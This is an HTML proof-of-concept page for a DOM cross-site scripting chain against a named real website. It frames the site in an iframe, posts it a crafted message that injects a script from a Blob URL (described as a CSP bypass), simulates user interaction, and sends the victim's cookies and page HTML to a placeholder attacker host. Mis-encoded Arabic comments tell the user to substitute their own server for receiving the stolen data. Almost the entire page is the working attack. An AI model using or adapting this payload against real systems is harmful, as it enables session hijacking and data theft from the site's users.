<!DOCTYPE html>
<html>
<head>
  <title>â˜ ï¸ Ultimate XSS Chain PoC</title>
  <meta charset="utf-8">
  <style>
    body { font-family: sans-serif; background: #111; color: #eee; padding: 30px; }
    iframe { border: 2px solid #444; width: 100%; height: 500px; margin-top: 20px; }
  </style>
</head>
<body>
  <h1>ğŸ”¥ Ultimate DOM XSS Chain via postMessage + Blob + Auto-Interaction</h1>
  <p>Sending malicious payload with DOM access + CSP bypass + interaction spoofing...</p>

  <iframe id="target" src="https://thebrowser.company/" sandbox="allow-scripts allow-same-origin allow-forms"></iframe>

  <script>
    const attackerServer = "https://evil.example.com/log"; // â† ØºÙŠÙ‘Ø±Ù‡ Ø¥Ù„Ù‰ Ø³ÙŠØ±ÙØ±Ùƒ Ø¥Ø°Ø§ Ø£Ø±Ø¯Øª Ø§Ø³ØªÙ‚Ø¨Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª

    // 1ï¸âƒ£: ÙƒÙˆØ¯ ÙŠØªÙ… ØªØ­Ù…ÙŠÙ„Ù‡ Ù…Ù† Blob URI
    const scriptContent = `
      // Simulate user action
      document.body.click?.();
      document.body.focus?.();

      // Try to leak DOM + cookies
      const data = {
        cookie: document.cookie,
        html: document.documentElement.outerHTML.slice(0, 1000)
      };

      fetch('${attackerServer}', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify(data)
      });

      alert('ğŸ”¥ XSS via Blob URI + Auto interaction + DOM exfiltration');
    `;

    // 2ï¸âƒ£: Ø¥Ù†Ø´Ø§Ø¡ Blob URI Ù„ØªØ¬Ø§ÙˆØ² CSP
    const blob = new Blob([scriptContent], { type: "text/javascript" });
    const blobUrl = URL.createObjectURL(blob);

    // 3ï¸âƒ£: Ø¥Ø¹Ø¯Ø§Ø¯ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
    const payload = {
      message: "OB_SHOULD_SHOW_PICKER",
      content: {
        marketerId: [
          `<script src="${blobUrl}"></script>`
        ]
      }
    };

    // 4ï¸âƒ£: Ø¥Ø±Ø³Ø§Ù„ postMessage Ø¨Ø¹Ø¯ ØªØ­Ù…ÙŠÙ„ iframe
    const iframe = document.getElementById("target");
    iframe.onload = () => {
      console.log("âœ… iframe loaded");
      setTimeout(() => {
        console.log("ğŸš€ Sending advanced XSS payload...");
        iframe.contentWindow.postMessage(payload, "*");
      }, 1000);
    };
  </script>
</body>
</html>
